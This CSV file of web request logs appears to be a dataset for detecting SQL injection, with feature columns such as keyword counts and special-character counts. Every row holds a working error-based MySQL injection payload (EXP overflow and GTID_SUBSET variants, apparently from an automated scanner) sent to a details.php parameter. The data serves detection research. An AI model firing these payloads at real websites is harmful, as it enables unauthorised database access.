full_url,parsed_url,event_time,hostname,sql_keyword,params_length,request_volume,special_chars,value_to_length
/details.php?prod=5&type=2%2B%28SELECT%20waQX%20WHERE%207488%3D7488%20OR%20EXP%28~%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285782%3D5782%2C1%29%29%29%2C0x7178706a71%2C0x78%29%29x%29%29%29%2B,"/details.php?prod=5&type=2+(SELECT waQX WHERE 7488=7488 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7176787171,(SELECT (ELT(5782=5782,1))),0x7178706a71,0x78))x)))+",1680093129.552855,10.0.2.31,4,135,220.4,0,2.962962962962963
/details.php?prod=5&type=2%29%29%20AS%20LwVN%20WHERE%207932%3D7932%20OR%20EXP%28~%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285782%3D5782%2C1%29%29%29%2C0x7178706a71%2C0x78%29%29x%29%29--%20ZDIL,"/details.php?prod=5&type=2)) AS LwVN WHERE 7932=7932 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7176787171,(SELECT (ELT(5782=5782,1))),0x7178706a71,0x78))x))-- ZDIL",1680093129.557329,10.0.2.31,5,137,220.4,1,4.37956204379562
/details.php?prod=5&type=2%29%20AS%20Mevg%20WHERE%206627%3D6627%20OR%20EXP%28~%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285782%3D5782%2C1%29%29%29%2C0x7178706a71%2C0x78%29%29x%29%29--%20DulY,"/details.php?prod=5&type=2) AS Mevg WHERE 6627=6627 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7176787171,(SELECT (ELT(5782=5782,1))),0x7178706a71,0x78))x))-- DulY",1680093129.560857,10.0.2.31,5,136,220.4,1,4.411764705882353
/details.php?prod=5&type=2%60%20WHERE%201982%3D1982%20OR%20EXP%28~%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285782%3D5782%2C1%29%29%29%2C0x7178706a71%2C0x78%29%29x%29%29--%20ZgFS,"/details.php?prod=5&type=2` WHERE 1982=1982 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7176787171,(SELECT (ELT(5782=5782,1))),0x7178706a71,0x78))x))-- ZgFS",1680093129.565898,10.0.2.31,4,128,220.4,1,3.90625
/details.php?prod=5&type=2%60%29%20WHERE%201555%3D1555%20OR%20EXP%28~%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285782%3D5782%2C1%29%29%29%2C0x7178706a71%2C0x78%29%29x%29%29--%20JhIi,"/details.php?prod=5&type=2`) WHERE 1555=1555 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7176787171,(SELECT (ELT(5782=5782,1))),0x7178706a71,0x78))x))-- JhIi",1680093129.571619,10.0.2.31,4,129,220.4,1,3.875968992248062
/details.php?prod=5&type=2%60%3D%602%60%20OR%20EXP%28~%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285782%3D5782%2C1%29%29%29%2C0x7178706a71%2C0x78%29%29x%29%29%20AND%20%602%60%3D%602,"/details.php?prod=5&type=2`=`2` OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7176787171,(SELECT (ELT(5782=5782,1))),0x7178706a71,0x78))x)) AND `2`=`2",1680093129.575681,10.0.2.31,4,120,220.4,0,3.3333333333333335
/details.php?prod=5&type=2%5D-%28SELECT%200%20WHERE%206587%3D6587%20OR%20EXP%28~%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285782%3D5782%2C1%29%29%29%2C0x7178706a71%2C0x78%29%29x%29%29%29%7C%5B2,"/details.php?prod=5&type=2]-(SELECT 0 WHERE 6587=6587 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7176787171,(SELECT (ELT(5782=5782,1))),0x7178706a71,0x78))x)))|[2",1680093129.580207,10.0.2.31,4,135,220.4,0,2.962962962962963
/details.php?prod=5&type=2%27%29%20OR%20EXP%28~%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285782%3D5782%2C1%29%29%29%2C0x7178706a71%2C0x78%29%29x%29%29--%20AhgK,"/details.php?prod=5&type=2') OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7176787171,(SELECT (ELT(5782=5782,1))),0x7178706a71,0x78))x))-- AhgK",1680093129.584581,10.0.2.31,3,113,220.4,2,4.424778761061947
/details.php?prod=5&type=2%27%20OR%20EXP%28~%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285782%3D5782%2C1%29%29%29%2C0x7178706a71%2C0x78%29%29x%29%29--%20UzPL,"/details.php?prod=5&type=2' OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7176787171,(SELECT (ELT(5782=5782,1))),0x7178706a71,0x78))x))-- UzPL",1680093129.588975,10.0.2.31,3,112,220.4,2,4.464285714285714
/details.php?prod=5&type=2%22%20OR%20EXP%28~%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285782%3D5782%2C1%29%29%29%2C0x7178706a71%2C0x78%29%29x%29%29--%20nQbh,"/details.php?prod=5&type=2"" OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7176787171,(SELECT (ELT(5782=5782,1))),0x7178706a71,0x78))x))-- nQbh",1680093129.592797,10.0.2.31,3,112,220.4,2,4.464285714285714
/details.php?prod=5&type=2%27%29%20OR%20EXP%28~%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285782%3D5782%2C1%29%29%29%2C0x7178706a71%2C0x78%29%29x%29%29%20AND%20%28%27AgPk%27%3D%27AgPk,"/details.php?prod=5&type=2') OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7176787171,(SELECT (ELT(5782=5782,1))),0x7178706a71,0x78))x)) AND ('AgPk'='AgPk",1680093129.596531,10.0.2.31,4,124,220.4,1,4.032258064516129
/details.php?prod=5&type=2%27%29%29%20OR%20EXP%28~%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285782%3D5782%2C1%29%29%29%2C0x7178706a71%2C0x78%29%29x%29%29%20AND%20%28%28%27LNpQ%27%3D%27LNpQ,"/details.php?prod=5&type=2')) OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7176787171,(SELECT (ELT(5782=5782,1))),0x7178706a71,0x78))x)) AND (('LNpQ'='LNpQ",1680093129.601047,10.0.2.31,4,126,220.4,1,3.9682539682539684
/details.php?prod=5&type=2%27%29%29%29%20OR%20EXP%28~%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285782%3D5782%2C1%29%29%29%2C0x7178706a71%2C0x78%29%29x%29%29%20AND%20%28%28%28%27KMsY%27%3D%27KMsY,"/details.php?prod=5&type=2'))) OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7176787171,(SELECT (ELT(5782=5782,1))),0x7178706a71,0x78))x)) AND ((('KMsY'='KMsY",1680093129.605191,10.0.2.31,4,128,220.4,1,3.90625
/details.php?prod=5&type=2%27%20OR%20EXP%28~%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285782%3D5782%2C1%29%29%29%2C0x7178706a71%2C0x78%29%29x%29%29%20AND%20%27JjMe%27%3D%27JjMe,"/details.php?prod=5&type=2' OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7176787171,(SELECT (ELT(5782=5782,1))),0x7178706a71,0x78))x)) AND 'JjMe'='JjMe",1680093129.608696,10.0.2.31,4,122,220.4,1,4.098360655737705
/details.php?prod=5&type=2%27%29%20OR%20EXP%28~%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285782%3D5782%2C1%29%29%29%2C0x7178706a71%2C0x78%29%29x%29%29%20AND%20%28%27yxvO%27%20LIKE%20%27yxvO,"/details.php?prod=5&type=2') OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7176787171,(SELECT (ELT(5782=5782,1))),0x7178706a71,0x78))x)) AND ('yxvO' LIKE 'yxvO",1680093129.61246,10.0.2.31,5,129,220.4,1,4.651162790697675
/details.php?prod=5&type=2%27%29%29%20OR%20EXP%28~%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285782%3D5782%2C1%29%29%29%2C0x7178706a71%2C0x78%29%29x%29%29%20AND%20%28%28%27gUxZ%27%20LIKE%20%27gUxZ,"/details.php?prod=5&type=2')) OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7176787171,(SELECT (ELT(5782=5782,1))),0x7178706a71,0x78))x)) AND (('gUxZ' LIKE 'gUxZ",1680093129.616782,10.0.2.31,5,131,220.4,1,4.580152671755725
/details.php?prod=5&type=2%27%29%29%29%20OR%20EXP%28~%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285782%3D5782%2C1%29%29%29%2C0x7178706a71%2C0x78%29%29x%29%29%20AND%20%28%28%28%27CmSK%27%20LIKE%20%27CmSK,"/details.php?prod=5&type=2'))) OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7176787171,(SELECT (ELT(5782=5782,1))),0x7178706a71,0x78))x)) AND ((('CmSK' LIKE 'CmSK",1680093129.620404,10.0.2.31,5,133,220.4,1,4.511278195488722
/details.php?prod=5&type=2%25%27%20OR%20EXP%28~%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285782%3D5782%2C1%29%29%29%2C0x7178706a71%2C0x78%29%29x%29%29%20AND%20%27EByt%25%27%3D%27EByt,"/details.php?prod=5&type=2%' OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7176787171,(SELECT (ELT(5782=5782,1))),0x7178706a71,0x78))x)) AND 'EByt%'='EByt",1680093129.624317,10.0.2.31,4,124,220.4,1,4.032258064516129
/details.php?prod=5&type=2%27%20OR%20EXP%28~%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285782%3D5782%2C1%29%29%29%2C0x7178706a71%2C0x78%29%29x%29%29%20AND%20%27gfTj%27%20LIKE%20%27gfTj,"/details.php?prod=5&type=2' OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7176787171,(SELECT (ELT(5782=5782,1))),0x7178706a71,0x78))x)) AND 'gfTj' LIKE 'gfTj",1680093129.628173,10.0.2.31,5,127,220.4,1,4.724409448818897
/details.php?prod=5&type=2%22%29%20OR%20EXP%28~%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285782%3D5782%2C1%29%29%29%2C0x7178706a71%2C0x78%29%29x%29%29%20AND%20%28%22uBMQ%22%3D%22uBMQ,"/details.php?prod=5&type=2"") OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7176787171,(SELECT (ELT(5782=5782,1))),0x7178706a71,0x78))x)) AND (""uBMQ""=""uBMQ",1680093129.631698,10.0.2.31,4,124,220.4,1,4.032258064516129
/details.php?prod=5&type=2%22%29%29%20OR%20EXP%28~%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285782%3D5782%2C1%29%29%29%2C0x7178706a71%2C0x78%29%29x%29%29%20AND%20%28%28%22kTOI%22%3D%22kTOI,"/details.php?prod=5&type=2"")) OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7176787171,(SELECT (ELT(5782=5782,1))),0x7178706a71,0x78))x)) AND ((""kTOI""=""kTOI",1680093129.635804,10.0.2.31,4,126,220.4,1,3.9682539682539684
/details.php?prod=5&type=2%22%29%29%29%20OR%20EXP%28~%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285782%3D5782%2C1%29%29%29%2C0x7178706a71%2C0x78%29%29x%29%29%20AND%20%28%28%28%22gcQr%22%3D%22gcQr,"/details.php?prod=5&type=2""))) OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7176787171,(SELECT (ELT(5782=5782,1))),0x7178706a71,0x78))x)) AND (((""gcQr""=""gcQr",1680093129.639698,10.0.2.31,4,128,220.4,1,3.90625
/details.php?prod=5&type=2%22%20OR%20EXP%28~%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285782%3D5782%2C1%29%29%29%2C0x7178706a71%2C0x78%29%29x%29%29%20AND%20%22XqOJ%22%3D%22XqOJ,"/details.php?prod=5&type=2"" OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7176787171,(SELECT (ELT(5782=5782,1))),0x7178706a71,0x78))x)) AND ""XqOJ""=""XqOJ",1680093129.643058,10.0.2.31,4,122,220.4,1,4.098360655737705
/details.php?prod=5&type=2%22%29%20OR%20EXP%28~%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285782%3D5782%2C1%29%29%29%2C0x7178706a71%2C0x78%29%29x%29%29%20AND%20%28%22BHmj%22%20LIKE%20%22BHmj,"/details.php?prod=5&type=2"") OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7176787171,(SELECT (ELT(5782=5782,1))),0x7178706a71,0x78))x)) AND (""BHmj"" LIKE ""BHmj",1680093129.646888,10.0.2.31,5,129,220.4,1,4.651162790697675
/details.php?prod=5&type=2%22%29%29%20OR%20EXP%28~%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285782%3D5782%2C1%29%29%29%2C0x7178706a71%2C0x78%29%29x%29%29%20AND%20%28%28%22kKQw%22%20LIKE%20%22kKQw,"/details.php?prod=5&type=2"")) OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7176787171,(SELECT (ELT(5782=5782,1))),0x7178706a71,0x78))x)) AND ((""kKQw"" LIKE ""kKQw",1680093129.650833,10.0.2.31,5,131,220.4,1,4.580152671755725
/details.php?prod=5&type=2%22%29%29%29%20OR%20EXP%28~%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285782%3D5782%2C1%29%29%29%2C0x7178706a71%2C0x78%29%29x%29%29%20AND%20%28%28%28%22QPvg%22%20LIKE%20%22QPvg,"/details.php?prod=5&type=2""))) OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7176787171,(SELECT (ELT(5782=5782,1))),0x7178706a71,0x78))x)) AND (((""QPvg"" LIKE ""QPvg",1680093129.654205,10.0.2.31,5,133,220.4,1,4.511278195488722
/details.php?prod=5&type=2%22%20OR%20EXP%28~%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285782%3D5782%2C1%29%29%29%2C0x7178706a71%2C0x78%29%29x%29%29%20AND%20%22XKQY%22%20LIKE%20%22XKQY,"/details.php?prod=5&type=2"" OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7176787171,(SELECT (ELT(5782=5782,1))),0x7178706a71,0x78))x)) AND ""XKQY"" LIKE ""XKQY",1680093129.657941,10.0.2.31,5,127,220.4,1,4.724409448818897
/details.php?prod=5&type=2%27%20OR%20EXP%28~%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285782%3D5782%2C1%29%29%29%2C0x7178706a71%2C0x78%29%29x%29%29%20OR%20%27pEhZ%27%3D%27uBSL,"/details.php?prod=5&type=2' OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7176787171,(SELECT (ELT(5782=5782,1))),0x7178706a71,0x78))x)) OR 'pEhZ'='uBSL",1680093129.661484,10.0.2.31,3,121,220.4,1,3.3057851239669422
/details.php?prod=5&type=2%27%29%20WHERE%203442%3D3442%20OR%20EXP%28~%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285782%3D5782%2C1%29%29%29%2C0x7178706a71%2C0x78%29%29x%29%29--%20CgQx,"/details.php?prod=5&type=2') WHERE 3442=3442 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7176787171,(SELECT (ELT(5782=5782,1))),0x7178706a71,0x78))x))-- CgQx",1680093129.664856,10.0.2.31,4,129,220.4,2,4.651162790697675
/details.php?prod=5&type=2%22%29%20WHERE%204000%3D4000%20OR%20EXP%28~%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285782%3D5782%2C1%29%29%29%2C0x7178706a71%2C0x78%29%29x%29%29--%20NnZP,"/details.php?prod=5&type=2"") WHERE 4000=4000 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7176787171,(SELECT (ELT(5782=5782,1))),0x7178706a71,0x78))x))-- NnZP",1680093129.668865,10.0.2.31,4,129,220.4,2,4.651162790697675
/details.php?prod=5&type=2%27%20WHERE%204621%3D4621%20OR%20EXP%28~%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285782%3D5782%2C1%29%29%29%2C0x7178706a71%2C0x78%29%29x%29%29--%20dftL,"/details.php?prod=5&type=2' WHERE 4621=4621 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7176787171,(SELECT (ELT(5782=5782,1))),0x7178706a71,0x78))x))-- dftL",1680093129.673246,10.0.2.31,4,128,220.4,2,4.6875
/details.php?prod=5&type=2%22%20WHERE%204431%3D4431%20OR%20EXP%28~%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285782%3D5782%2C1%29%29%29%2C0x7178706a71%2C0x78%29%29x%29%29--%20hquS,"/details.php?prod=5&type=2"" WHERE 4431=4431 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7176787171,(SELECT (ELT(5782=5782,1))),0x7178706a71,0x78))x))-- hquS",1680093129.676622,10.0.2.31,4,128,220.4,2,4.6875
/details.php?prod=5&type=2%27%7C%7C%28SELECT%200x68764841%20WHERE%205861%3D5861%20OR%20EXP%28~%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285782%3D5782%2C1%29%29%29%2C0x7178706a71%2C0x78%29%29x%29%29%29%7C%7C%27,"/details.php?prod=5&type=2'||(SELECT 0x68764841 WHERE 5861=5861 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7176787171,(SELECT (ELT(5782=5782,1))),0x7178706a71,0x78))x)))||'",1680093129.680498,10.0.2.31,4,145,220.4,1,3.4482758620689653
/details.php?prod=5&type=2%27%7C%7C%28SELECT%200x45484b74%20FROM%20DUAL%20WHERE%203079%3D3079%20OR%20EXP%28~%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285782%3D5782%2C1%29%29%29%2C0x7178706a71%2C0x78%29%29x%29%29%29%7C%7C%27,"/details.php?prod=5&type=2'||(SELECT 0x45484b74 FROM DUAL WHERE 3079=3079 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7176787171,(SELECT (ELT(5782=5782,1))),0x7178706a71,0x78))x)))||'",1680093129.68507,10.0.2.31,4,155,220.4,1,3.225806451612903
/details.php?prod=5&type=2%27%2B%28SELECT%200x744c4a67%20WHERE%206525%3D6525%20OR%20EXP%28~%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285782%3D5782%2C1%29%29%29%2C0x7178706a71%2C0x78%29%29x%29%29%29%2B%27,"/details.php?prod=5&type=2'+(SELECT 0x744c4a67 WHERE 6525=6525 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7176787171,(SELECT (ELT(5782=5782,1))),0x7178706a71,0x78))x)))+'",1680093129.688713,10.0.2.31,4,143,220.4,1,3.4965034965034967
/details.php?prod=5&type=2%7C%7C%28SELECT%200x4a644559%20FROM%20DUAL%20WHERE%203339%3D3339%20OR%20EXP%28~%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285782%3D5782%2C1%29%29%29%2C0x7178706a71%2C0x78%29%29x%29%29%29%7C%7C,"/details.php?prod=5&type=2||(SELECT 0x4a644559 FROM DUAL WHERE 3339=3339 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7176787171,(SELECT (ELT(5782=5782,1))),0x7178706a71,0x78))x)))||",1680093129.692649,10.0.2.31,4,153,220.4,0,2.6143790849673203
/details.php?prod=5&type=2%7C%7C%28SELECT%200x57415175%20WHERE%209789%3D9789%20OR%20EXP%28~%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285782%3D5782%2C1%29%29%29%2C0x7178706a71%2C0x78%29%29x%29%29%29%7C%7C,"/details.php?prod=5&type=2||(SELECT 0x57415175 WHERE 9789=9789 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7176787171,(SELECT (ELT(5782=5782,1))),0x7178706a71,0x78))x)))||",1680093129.697033,10.0.2.31,4,143,220.4,0,2.797202797202797
/details.php?prod=5&type=2%2B%28SELECT%200x75424c72%20WHERE%206270%3D6270%20OR%20EXP%28~%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285782%3D5782%2C1%29%29%29%2C0x7178706a71%2C0x78%29%29x%29%29%29%2B,"/details.php?prod=5&type=2+(SELECT 0x75424c72 WHERE 6270=6270 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7176787171,(SELECT (ELT(5782=5782,1))),0x7178706a71,0x78))x)))+",1680093129.700756,10.0.2.31,4,141,220.4,0,2.8368794326241136
/details.php?prod=5&type=2%27%29%29%20AS%20sRQZ%20WHERE%204433%3D4433%20OR%20EXP%28~%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285782%3D5782%2C1%29%29%29%2C0x7178706a71%2C0x78%29%29x%29%29--%20WOJa,"/details.php?prod=5&type=2')) AS sRQZ WHERE 4433=4433 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7176787171,(SELECT (ELT(5782=5782,1))),0x7178706a71,0x78))x))-- WOJa",1680093129.704974,10.0.2.31,5,138,220.4,2,5.072463768115942
/details.php?prod=5&type=2%22%29%29%20AS%20FcZO%20WHERE%201085%3D1085%20OR%20EXP%28~%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285782%3D5782%2C1%29%29%29%2C0x7178706a71%2C0x78%29%29x%29%29--%20YQTR,"/details.php?prod=5&type=2"")) AS FcZO WHERE 1085=1085 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7176787171,(SELECT (ELT(5782=5782,1))),0x7178706a71,0x78))x))-- YQTR",1680093129.710307,10.0.2.31,5,138,220.4,2,5.072463768115942
/details.php?prod=5&type=2%27%29%20AS%20mWwu%20WHERE%207242%3D7242%20OR%20EXP%28~%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285782%3D5782%2C1%29%29%29%2C0x7178706a71%2C0x78%29%29x%29%29--%20vces,"/details.php?prod=5&type=2') AS mWwu WHERE 7242=7242 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7176787171,(SELECT (ELT(5782=5782,1))),0x7178706a71,0x78))x))-- vces",1680093129.714534,10.0.2.31,5,137,220.4,2,5.109489051094891
/details.php?prod=5&type=2%22%29%20AS%20ZDKS%20WHERE%202460%3D2460%20OR%20EXP%28~%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285782%3D5782%2C1%29%29%29%2C0x7178706a71%2C0x78%29%29x%29%29--%20DrVB,"/details.php?prod=5&type=2"") AS ZDKS WHERE 2460=2460 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7176787171,(SELECT (ELT(5782=5782,1))),0x7178706a71,0x78))x))-- DrVB",1680093129.718948,10.0.2.31,5,137,220.4,2,5.109489051094891
/details.php?prod=5&type=2%22%3D%222%22%20OR%20EXP%28~%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285782%3D5782%2C1%29%29%29%2C0x7178706a71%2C0x78%29%29x%29%29%20AND%20%222%22%3D%222,"/details.php?prod=5&type=2""=""2"" OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7176787171,(SELECT (ELT(5782=5782,1))),0x7178706a71,0x78))x)) AND ""2""=""2",1680093129.722599,10.0.2.31,4,120,220.4,1,4.166666666666667
/details.php?prod=5&type=2%27%20IN%20BOOLEAN%20MODE%29%20OR%20EXP%28~%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285782%3D5782%2C1%29%29%29%2C0x7178706a71%2C0x78%29%29x%29%29%23,"/details.php?prod=5&type=2' IN BOOLEAN MODE) OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7176787171,(SELECT (ELT(5782=5782,1))),0x7178706a71,0x78))x))#",1680093129.726805,10.0.2.31,4,123,220.4,2,4.878048780487805
/details.php?prod=5&type=2%29%20AND%20GTID_SUBSET%28CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285357%3D5357%2C1%29%29%29%2C0x7178706a71%29%2C5357%29--%20IBZc,"/details.php?prod=5&type=2) AND GTID_SUBSET(CONCAT(0x7176787171,(SELECT (ELT(5357=5357,1))),0x7178706a71),5357)-- IBZc",1680093129.730753,10.0.2.31,3,94,220.4,1,4.25531914893617
/details.php?prod=5&type=2%29%20AND%20GTID_SUBSET%28CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285357%3D5357%2C1%29%29%29%2C0x7178706a71%29%2C5357%29%20AND%20%284019%3D4019,"/details.php?prod=5&type=2) AND GTID_SUBSET(CONCAT(0x7176787171,(SELECT (ELT(5357=5357,1))),0x7178706a71),5357) AND (4019=4019",1680093129.73518,10.0.2.31,3,102,220.4,0,2.9411764705882355
/details.php?prod=5&type=2%29%29%20AND%20GTID_SUBSET%28CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285357%3D5357%2C1%29%29%29%2C0x7178706a71%29%2C5357%29%20AND%20%28%285969%3D5969,"/details.php?prod=5&type=2)) AND GTID_SUBSET(CONCAT(0x7176787171,(SELECT (ELT(5357=5357,1))),0x7178706a71),5357) AND ((5969=5969",1680093129.739244,10.0.2.31,3,104,220.4,0,2.8846153846153846
/details.php?prod=5&type=2%29%29%29%20AND%20GTID_SUBSET%28CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285357%3D5357%2C1%29%29%29%2C0x7178706a71%29%2C5357%29%20AND%20%28%28%289422%3D9422,"/details.php?prod=5&type=2))) AND GTID_SUBSET(CONCAT(0x7176787171,(SELECT (ELT(5357=5357,1))),0x7178706a71),5357) AND (((9422=9422",1680093129.742776,10.0.2.31,3,106,220.4,0,2.830188679245283
/details.php?prod=5&type=2%20AND%20GTID_SUBSET%28CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285357%3D5357%2C1%29%29%29%2C0x7178706a71%29%2C5357%29,"/details.php?prod=5&type=2 AND GTID_SUBSET(CONCAT(0x7176787171,(SELECT (ELT(5357=5357,1))),0x7178706a71),5357)",1680093129.746783,10.0.2.31,3,86,220.4,0,3.488372093023256
